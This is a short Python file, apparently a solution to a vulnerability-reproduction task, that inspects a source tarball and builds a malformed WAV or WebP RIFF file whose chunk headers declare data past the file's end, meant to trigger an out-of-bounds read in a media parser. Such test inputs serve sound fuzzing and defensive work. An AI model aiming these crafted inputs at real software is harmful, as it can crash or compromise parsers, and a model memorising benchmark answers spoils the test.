import os
import struct
import tarfile
from typing import Optional


class Solution:
    def _tar_name_has_any(self, src_path: str, keywords) -> bool:
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    n = (m.name or "").lower()
                    for kw in keywords:
                        if kw in n:
                            return True
        except Exception:
            return False
        return False

    def _make_wav_poc(self) -> bytes:
        riff_size = 36  # ends immediately after the data chunk header
        fmt_chunk = b"fmt " + struct.pack("<I", 16) + struct.pack(
            "<HHIIHH",
            1,      # PCM
            1,      # channels
            8000,   # sample rate
            8000,   # byte rate (sr * block_align)
            1,      # block align
            8,      # bits per sample
        )
        data_chunk = b"data" + struct.pack("<I", 16)  # declares payload past RIFF end
        return b"RIFF" + struct.pack("<I", riff_size) + b"WAVE" + fmt_chunk + data_chunk

    def _make_webp_poc(self) -> bytes:
        riff_size = 12  # ends immediately after the VP8 chunk header
        vp8_chunk = b"VP8 " + struct.pack("<I", 10)  # declares payload past RIFF end
        return b"RIFF" + struct.pack("<I", riff_size) + b"WEBP" + vp8_chunk

    def solve(self, src_path: str) -> bytes:
        src_lower = (src_path or "").lower()

        is_webp = False
        if "webp" in src_lower:
            is_webp = True
        elif src_path and os.path.exists(src_path):
            is_webp = self._tar_name_has_any(src_path, ("webp", "vp8", "vp8l", "vp8x"))

        if is_webp:
            return self._make_webp_poc()

        return self._make_wav_poc()